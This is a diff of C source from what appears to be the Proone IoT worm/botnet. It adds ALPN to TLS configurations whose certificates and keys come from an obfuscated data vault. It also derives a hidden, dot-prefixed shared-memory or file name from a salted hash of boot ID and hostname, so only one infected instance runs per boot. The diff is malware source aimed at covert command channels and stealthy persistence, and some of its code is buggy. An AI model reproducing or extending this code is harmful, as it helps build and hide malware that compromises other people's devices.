@@ -1,7 +1,6 @@
 #include <stdbool.h>
 #include <stddef.h>
 #include <stdint.h>
-#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
@@ -16,6 +15,8 @@
 #include <sys/file.h>
 #include <sys/wait.h>
 #include <elf.h>
+
+#include <mbedtls/sha256.h>
 
 #include "config.h"
 #include "proone.h"
@@ -315,6 +316,7 @@ static void load_ssl_conf (void) {
 	prne_dbgpf("%s() returned %d\n", f, mret);\
 	break;\
 }
+	static const char *ALP_LIST[] = { PRNE_HTBT_TLS_ALP, NULL };
 	size_t dvlen = 0;
 	int mret;
 	const uint8_t *data;
@@ -324,52 +326,74 @@ static void load_ssl_conf (void) {
 		mret = mbedtls_x509_crt_parse(&prne_g.ssl.ca, data, dvlen);
 		BREAKIF_ERR("mbedtls_x509_crt_parse");
 
-		// Server stuff
-		mret = mbedtls_ssl_config_defaults(
-			&prne_g.s_ssl.conf,
-			MBEDTLS_SSL_IS_SERVER,
-			MBEDTLS_SSL_TRANSPORT_STREAM,
-			MBEDTLS_SSL_PRESET_DEFAULT);
-		BREAKIF_ERR("mbedtls_ssl_config_defaults");
-		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_CRT, &dvlen);
-		mret = mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, data, dvlen);
-		BREAKIF_ERR("mbedtls_x509_crt_parse");
-		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_KEY, &dvlen);
-		mret = mbedtls_pk_parse_key(&prne_g.s_ssl.pk, data, dvlen, NULL, 0);
-		BREAKIF_ERR("mbedtls_pk_parse_key");
-		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_DH, &dvlen);
-		mret = mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, data, dvlen);
-		BREAKIF_ERR("mbedtls_dhm_parse_dhm");
-		mret = mbedtls_ssl_conf_own_cert(
-			&prne_g.s_ssl.conf,
-			&prne_g.s_ssl.crt,
-			&prne_g.s_ssl.pk);
-		BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
-		mret = mbedtls_ssl_conf_dh_param_ctx(
-			&prne_g.s_ssl.conf,
-			&prne_g.s_ssl.dhm);
-		BREAKIF_ERR("mbedtls_ssl_conf_dh_param_ctx");
-		prne_g.s_ssl.ready = true;
+		do {
+			// Server stuff
+			mret = mbedtls_ssl_config_defaults(
+				&prne_g.s_ssl.conf,
+				MBEDTLS_SSL_IS_SERVER,
+				MBEDTLS_SSL_TRANSPORT_STREAM,
+				MBEDTLS_SSL_PRESET_DEFAULT);
+			BREAKIF_ERR("mbedtls_ssl_config_defaults");
+			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_CRT, &dvlen);
+			mret = mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, data, dvlen);
+			BREAKIF_ERR("mbedtls_x509_crt_parse");
+			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_KEY, &dvlen);
+			mret = mbedtls_pk_parse_key(
+				&prne_g.s_ssl.pk,
+				data,
+				dvlen,
+				NULL,
+				0);
+			BREAKIF_ERR("mbedtls_pk_parse_key");
+			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_DH, &dvlen);
+			mret = mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, data, dvlen);
+			BREAKIF_ERR("mbedtls_dhm_parse_dhm");
+			mret = mbedtls_ssl_conf_own_cert(
+				&prne_g.s_ssl.conf,
+				&prne_g.s_ssl.crt,
+				&prne_g.s_ssl.pk);
+			BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
+			mret = mbedtls_ssl_conf_dh_param_ctx(
+				&prne_g.s_ssl.conf,
+				&prne_g.s_ssl.dhm);
+			BREAKIF_ERR("mbedtls_ssl_conf_dh_param_ctx");
+			mret = mbedtls_ssl_conf_alpn_protocols(
+				&prne_g.s_ssl.conf,
+				ALP_LIST);
+			BREAKIF_ERR("mbedtls_ssl_conf_alpn_protocols");
+			prne_g.s_ssl.ready = true;
+		} while (false);
 
-		// Client stuff
-		mret = mbedtls_ssl_config_defaults(
-			&prne_g.c_ssl.conf,
-			MBEDTLS_SSL_IS_SERVER,
-			MBEDTLS_SSL_TRANSPORT_STREAM,
-			MBEDTLS_SSL_PRESET_DEFAULT);
-		BREAKIF_ERR("mbedtls_ssl_config_defaults");
-		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_CRT, &dvlen);
-		mret = mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, data, dvlen);
-		BREAKIF_ERR("mbedtls_x509_crt_parse");
-		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_KEY, &dvlen);
-		mret = mbedtls_pk_parse_key(&prne_g.c_ssl.pk, data, dvlen, NULL, 0);
-		BREAKIF_ERR("mbedtls_pk_parse_key");
-		mret = mbedtls_ssl_conf_own_cert(
-			&prne_g.c_ssl.conf,
-			&prne_g.c_ssl.crt,
-			&prne_g.c_ssl.pk);
-		BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
-		prne_g.c_ssl.ready = true;
+		do {
+			// Client stuff
+			mret = mbedtls_ssl_config_defaults(
+				&prne_g.c_ssl.conf,
+				MBEDTLS_SSL_IS_SERVER,
+				MBEDTLS_SSL_TRANSPORT_STREAM,
+				MBEDTLS_SSL_PRESET_DEFAULT);
+			BREAKIF_ERR("mbedtls_ssl_config_defaults");
+			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_CRT, &dvlen);
+			mret = mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, data, dvlen);
+			BREAKIF_ERR("mbedtls_x509_crt_parse");
+			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_KEY, &dvlen);
+			mret = mbedtls_pk_parse_key(
+				&prne_g.c_ssl.pk,
+				data,
+				dvlen,
+				NULL,
+				0);
+			BREAKIF_ERR("mbedtls_pk_parse_key");
+			mret = mbedtls_ssl_conf_own_cert(
+				&prne_g.c_ssl.conf,
+				&prne_g.c_ssl.crt,
+				&prne_g.c_ssl.pk);
+			BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
+			mret = mbedtls_ssl_conf_alpn_protocols(
+				&prne_g.c_ssl.conf,
+				ALP_LIST);
+			BREAKIF_ERR("mbedtls_ssl_conf_alpn_protocols");
+			prne_g.c_ssl.ready = true;
+		} while (false);
 	} while (false);
 	prne_dvault_reset();
 
@@ -429,63 +453,165 @@ static bool format_shared_global (const int fd) {
 	switch (rev) {
 	// Future format update code goes here
 	case 0:
-		if (lseek(fd, 0, SEEK_END) >= (off_t)sizeof(struct prne_shared_global)) {
-			return true;
-		}
-		break;
+		return
+			lseek(fd, 0, SEEK_END) >= (off_t)sizeof(struct prne_shared_global);
 	}
 
 	return false;
 }
 
-static bool init_shared_global (void) {
-	int fd;
-	const char *fname;
-	bool ret = true;
+static void skel_shared_global (struct prne_shared_global *skel) {
+	prne_memzero(skel, sizeof(skel));
+	// Future code for new shared_global format goes here
+	skel->rev = 0;
+}
 
-	/* TODO
-	* 3. Try creating and opening /tmp/...
-	* 4. Try creating and opening random file in current wd
-	* 5. ... just don't use shared memory if all of these fail
-	*/
+/* Hash following to get name for shared global backing file:
+*	The salt value "proone"
+*	Boot ID
+*	Hostname
+* (In this order!)
+*
+* Note that the shared global is meant to be persistent only for current boot.
+* It will be lost after the machine restart.
+*/
+static void hash_shg_name (char *out) {
+	mbedtls_sha256_context h;
+	uint8_t m[32];
+	size_t dv_len;
+	const uint8_t *dv_dat;
+	int fd = -1, f_ret;
 
-	fname = prne_dvault_get_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL);
-	do {
-		fd = shm_open(fname, O_RDWR, 0600);
-		if (fd >= 0) {
-			if (!try_lock_file(fd)) {
-				ret = false;
-				goto END;
-			}
-			if (format_shared_global(fd)) {
-				break;
-			}
-			else {
-				prne_close(fd);
-				fd = -1;
+	prne_memzero(m, sizeof(m));
+	mbedtls_sha256_init(&h);
+
+// TRY
+	if (mbedtls_sha256_starts_ret(&h, 0) != 0) {
+		goto CATCH;
+	}
+
+	dv_dat = prne_dvault_get_bin(PRNE_DATA_KEY_SHG_SALT, &dv_len);
+	if (mbedtls_sha256_update_ret(&h, dv_dat, dv_len) != 0) {
+		goto CATCH;
+	}
+	prne_dvault_reset();
+
+	if (mbedtls_sha256_update_ret(&h, prne_g.boot_id, 16) != 0) {
+		goto CATCH;
+	}
+
+	fd = open("/etc/hostname", O_RDONLY);
+	if (fd >= 0) {
+		uint8_t buf[256];
+
+		f_ret = read(fd, buf, sizeof(buf));
+		if (f_ret > 0) {
+			if (mbedtls_sha256_update_ret(&h, buf, f_ret) != 0) {
+				goto CATCH;
 			}
 		}
+		prne_close(fd);
+		fd = -1;
+	}
 
-		fd = shm_open(fname, O_RDWR | O_CREAT | O_TRUNC, 0600);
-		if (fd >= 0) {
-			struct prne_shared_global skel;
+	mbedtls_sha256_finish_ret(&h, m);
 
-			if (!try_lock_file(fd)) {
-				ret = false;
-				goto END;
-			}
+CATCH:
+	prne_dvault_reset();
+	mbedtls_sha256_free(&h);
+	out[0] = '/';
+	out[1] = '.';
+	prne_uuid_tostr(m, out + 2);
+	out[38] = 0;
+	prne_close(fd);
+}
 
-			prne_memzero(&skel, sizeof(skel));
-			// Future code for new shared_global format goes here
-			skel.rev = 0;
-
-			if (write(fd, &skel, sizeof(skel)) != sizeof(skel)) {
-				goto END;
-			}
+static bool try_open_sg (const char *path, const bool shm, int *ret) {
+	*ret = shm ?
+		shm_open(path, O_RDWR, 0600) :
+		open(path, O_RDWR, 0600);
+	if (*ret >= 0) {
+		if (!try_lock_file(*ret)) {
+			return false;
+		}
+		if (format_shared_global(*ret)) {
+			return true;
 		}
 		else {
+			close(*ret);
+			*ret = -1;
+		}
+	}
+
+	*ret = shm ?
+		shm_open(path, O_RDWR | O_CREAT | O_TRUNC, 0600) :
+		open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
+	if (*ret >= 0) {
+		struct prne_shared_global skel;
+
+		skel_shared_global(&skel);
+
+		if (!(try_lock_file(*ret) &&
+			write(*ret, &skel, sizeof(skel)) == sizeof(skel)))
+		{
+			close(*ret);
+			*ret = -1;
+		}
+	}
+
+	return true;
+}
+
+/* init_shared_global ()
+*
+* Returns true if there's no other process detected. Returns false otherwise
+* to indicate that the program should not progress further.
+*/
+static bool init_shared_global (void) {
+	int fd = -1;
+	char fname[39];
+	char path[38 + prne_op_max(sizeof("/tmp"), sizeof("."))];
+	bool ret = true;
+
+	/*
+	* 1. Try creating shm, which is the most favourable
+	* 2. Try creating a file in /tmp, which is memory backed on most env
+	* 3. Try creating a file in current wd
+	*
+	* ... just don't use shared memory if all of these fail
+	*/
+	hash_shg_name(fname);
+
+	do {
+		ret = try_open_sg(fname, true, &fd);
+		if (!ret) {
 			goto END;
 		}
+		if (fd >= 0) {
+			break;
+		}
+
+		strcpy(path, "/tmp");
+		strcat(path, fname);
+		ret = try_open_sg(path, false, &fd);
+		if (!ret) {
+			goto END;
+		}
+		if (fd >= 0) {
+			break;
+		}
+
+		strcpy(path, ".");
+		strcat(path, fname);
+		ret = try_open_sg(path, false, &fd);
+		if (!ret) {
+			goto END;
+		}
+		if (fd >= 0) {
+			break;
+		}
+
+		goto END;
 	} while (false);
 
 	prne_s_g = (struct prne_shared_global*)mmap(
@@ -523,7 +649,11 @@ static void init_ids (void) {
 	char line[37];
 	int fd = -1;
 
-	if (mbedtls_ctr_drbg_random(&prne_g.ssl.rnd, prne_g.instance_id, sizeof(prne_g.instance_id)) != 0) {
+	if (mbedtls_ctr_drbg_random(
+		&prne_g.ssl.rnd,
+		prne_g.instance_id,
+		sizeof(prne_g.instance_id)) != 0)
+	{
 		prne_memzero(prne_g.instance_id, sizeof(prne_g.instance_id));
 	}
 
